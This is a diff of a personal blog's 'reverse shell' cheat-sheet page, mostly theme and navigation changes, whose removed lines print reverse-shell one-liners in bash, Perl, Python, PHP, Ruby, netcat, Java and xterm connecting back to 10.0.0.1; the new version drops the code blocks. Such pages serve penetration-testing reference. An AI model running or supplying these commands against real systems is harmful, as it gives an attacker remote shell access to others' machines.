@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.49.2" />
+<meta name="generator" content="Hugo 0.62.2" />
 
     
     
@@ -22,26 +22,27 @@
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="reverse shell"/>
-<meta name="twitter:description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
- bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
- perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&S&#34;);open(STDOUT,&#34;&S&#34;);open(STDERR,&#34;&S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&nbsp;alternative PERL revere shell here.
+<meta name="twitter:description" content="Listen for 8080 first Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+There’s also an alternative PERL revere shell here.
 Python This was tested under Linux / Python 2.7:
- python -c &#39;import socket,subprocess,os;s=socket."/>
+PHP This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…"/>
 
 <meta property="og:title" content="reverse shell" />
-<meta property="og:description" content="Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
- bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
- perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&S&#34;);open(STDOUT,&#34;&S&#34;);open(STDERR,&#34;&S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;  There’s also an&nbsp;alternative PERL revere shell here.
+<meta property="og:description" content="Listen for 8080 first Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
+There’s also an alternative PERL revere shell here.
 Python This was tested under Linux / Python 2.7:
- python -c &#39;import socket,subprocess,os;s=socket." />
+PHP This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://feisky.xyz/posts/2015-01-28-reverse-shell/" />
+
 
 
     
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
 
 
 
@@ -50,15 +51,15 @@ Python This was tested under Linux / Python 2.7:
 
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/hyde-hyde.6f40d28e777b288cb757a1db116a257b6f8dffc63a05e8473d12dc09a52d8d79.css" integrity="sha256-b0DSjnd7KIy3V6HbEWole2&#43;N/8Y6BehHPRLcCaUtjXk=">
+<link rel="stylesheet" href="/scss/hyde-hyde.92c66d107d7b219f0792cfd67223179af884b03f386ac46894f9f735932bbca3.css" integrity="sha256-ksZtEH17IZ8Hks/WciMXmviEsD84asRolPn3NZMrvKM=">
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
 
 
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/hugo-toc.8549a64d301421b4256ea9a0d5ca8b99178799f569d5d2daeb95f24cef3ce6b7.css" integrity="sha256-hUmmTTAUIbQlbqmg1cqLmReHmfVp1dLa65XyTO885rc=">
+<link rel="stylesheet" href="/scss/tocbot.126e7d75240acc946d34d6ccb2982ed4c394a5fe34e73e1a2119ca951bcf119d.css" integrity="sha256-Em59dSQKzJRtNNbMspgu1MOUpf405z4aIRnKlRvPEZ0=">
 
 
 
@@ -70,6 +71,7 @@ Python This was tested under Linux / Python 2.7:
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
     
 
 </head>
@@ -83,6 +85,7 @@ Python This was tested under Linux / Python 2.7:
       <span class="site__title">
         <a href="https://feisky.xyz/">Feisky</a>
       </span>
+      
       
       <p class="site__description">
          Notes about anything 
@@ -99,7 +102,23 @@ Python This was tested under Linux / Python 2.7:
 			 
 				<li>
 					<a href="https://kubernetes.feisky.xyz">
-						<span>Kubernetes</span>
+						<span>Kubernetes指南</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="https://time.geekbang.org/column/intro/100020901">
+						<span>Linux性能优化实战</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="https://sdn.feisky.xyz">
+						<span>SDN网络</span>
 					</a>
 				</li>
 			 
@@ -114,21 +133,12 @@ Python This was tested under Linux / Python 2.7:
 		 
 			 
 				<li>
-					<a href="https://sdn.feisky.xyz">
-						<span>SDN</span>
-					</a>
-				</li>
-			 
-		 
-			 
-				<li>
 					<a href="/about/">
-						<span>About</span>
+						<span>关于我</span>
 					</a>
 				</li>
 			 
 		
-		</li>
 	</ul>
 </div>
 
@@ -151,23 +161,33 @@ Python This was tested under Linux / Python 2.7:
 	
 	
 	
+	
+	
 </section>
 
       </div>
     </div>
-    <div class="copyright">
-  &copy; 2019 .
-  <a href="https://creativecommons.org/licenses/by-sa/4.0">Some Rights Reserved</a>.
-  Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+    
+<div class="copyright">
+  &copy; 2020 feiskyer
+  
+    <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
   
 </div>
+
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
 
   </div>
 </div>
 
         <div class="content container">
             
-    <article>
+    
+<article>
   <header>
     <h1>reverse shell</h1>
     
@@ -187,140 +207,76 @@ Python This was tested under Linux / Python 2.7:
   </header>
   
   
-  <div class="toc-wrapper">
-    <input type="checkbox" id="tocToggle">
-    <label for="tocToggle">Table of Content</label>
-    
-        <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li>
-<ul>
-<li><a href="#listen-for-8080-first">Listen for 8080 first</a></li>
-<li><a href="#bash">Bash</a></li>
-<li><a href="#perl">PERL</a></li>
-<li><a href="#python">Python</a></li>
-<li><a href="#php">PHP</a></li>
-<li><a href="#ruby">Ruby</a></li>
-<li><a href="#netcat">Netcat</a></li>
-<li><a href="#java">Java</a></li>
-<li><a href="#xterm">xterm</a></li>
-</ul></li>
-</ul></li>
-</ul>
-</nav>
-    
-  </div>
+  
+    <div class="toc-wrapper">
+      <input type="checkbox" id="tocToggle">
+      <label for="tocToggle">Table of Content</label>
+      
+        <div class="toc" id="TableOfContents"></div>
+      
+    </div>
+  
   
   <div class="post">
-    
-
-<h3 id="listen-for-8080-first">Listen for 8080 first</h3>
-
-<pre>
-nc -l -p 8080 -vvv
-</pre>
-
+    <h3 id="listen-for-8080-first">Listen for 8080 first</h3>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h3 id="bash">Bash</h3>
-
 <p>Some versions of <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/">bash can send you a reverse shell</a> (this was tested on Ubuntu 10.10):</p>
-
-<pre>
-bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h3 id="perl">PERL</h3>
-
 <p>Here’s a shorter, feature-free version of the <a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">perl-reverse-shell</a>:</p>
-
-<pre>
-perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-</pre>
-
-<p>There’s also an&nbsp;<a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>There’s also an <a href="http://www.plenz.com/reverseshell">alternative PERL revere shell here</a>.</p>
 <h3 id="python">Python</h3>
-
 <p>This was tested under Linux / Python 2.7:</p>
-
-<pre>
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h3 id="php">PHP</h3>
-
-<p>This code assumes that the TCP connection uses file descriptor 3. &nbsp;This worked on my test system. &nbsp;If it doesn’t work, try 4, 5, 6…</p>
-
-<pre>
-php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
-</pre>
-
+<p>This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>If you want a .php file to upload, see the more featureful and robust <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>.</p>
-
 <h3 id="ruby">Ruby</h3>
-
-<pre>
-ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h3 id="netcat">Netcat</h3>
-
 <p>Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.</p>
-
-<pre>
-nc -e /bin/sh 10.0.0.1 1234
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>If you have the wrong version of netcat installed, <a href="http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498">Jeff Price points out here</a> that you might still be able to get your reverse shell back like this:</p>
-
-<pre>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <h3 id="java">Java</h3>
-
-<pre>
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-</pre>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>[Untested submission from anonymous reader]</p>
-
 <h3 id="xterm">xterm</h3>
-
-<p>One of the simplest forms of reverse shell is an xterm session. &nbsp;The following command should be run on the server. &nbsp;It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
-
-<pre>
-xterm -display 10.0.0.1:1
-</pre>
-
-<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). &nbsp;One way to do this is with Xnest (to be run on your system):</p>
-
-<pre>
-Xnest :1
-</pre>
-
+<p>One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>You’ll need to authorise the target to connect to you (command also run on your host):</p>
-
-<pre>
-xhost +targetip
-</pre>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 
   </div>
   
 
 <div class="navigation navigation-single">
     
-    <a href="/posts/2015-06-24-sysdig/" class="navigation-prev">
+    <a href="/posts/2015-03-02-setting-up-gre-for-kubernetes/" class="navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">sysdig</span>
+      <span class="navigation-tittle">Setting up GRE for Kubernetes</span>
     </a>
     
     
-    <a href="/posts/2015-06-05-git-commit/" class="navigation-next">
-      <span class="navigation-tittle">git commit修改前一次提交的方法</span>
+    <a href="/posts/2015-03-06-redhat-atomic-host/" class="navigation-next">
+      <span class="navigation-tittle">Redhat Atomic Host</span>
       <i aria-hidden="true" class="fa fa-chevron-right"></i>
     </a>
     
@@ -371,6 +327,7 @@ xhost +targetip
         </div>
         
     
+
   
   
 <script type="application/javascript">
@@ -385,15 +342,12 @@ if (!doNotTrack) {
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
 
-<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
-  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
-  crossorigin="anonymous">
-</script>
+<script defer src="https://use.fontawesome.com/releases/v5.5.0/js/all.js" integrity="sha384-GqVMZRt5Gn7tB9D9q7ONtcp4gtHIUEW/yG7h98J7IpE3kpi+srfFyyB/04OV6pG0" crossorigin="anonymous"></script>
 
 
     
     
-        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
         
     
     <script type="text/javascript">
@@ -404,6 +358,21 @@ if (!doNotTrack) {
 
 
 
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.js"></script>
+<script type="text/javascript">
+  if (tocbot) {
+    tocbot.init({
+      
+      tocSelector: '.toc',
+      
+      contentSelector: '.post',
+      
+      headingSelector: 'h2, h3, h4',
+      collapseDepth: 4
+    });
+  }
+</script>
 
 
 
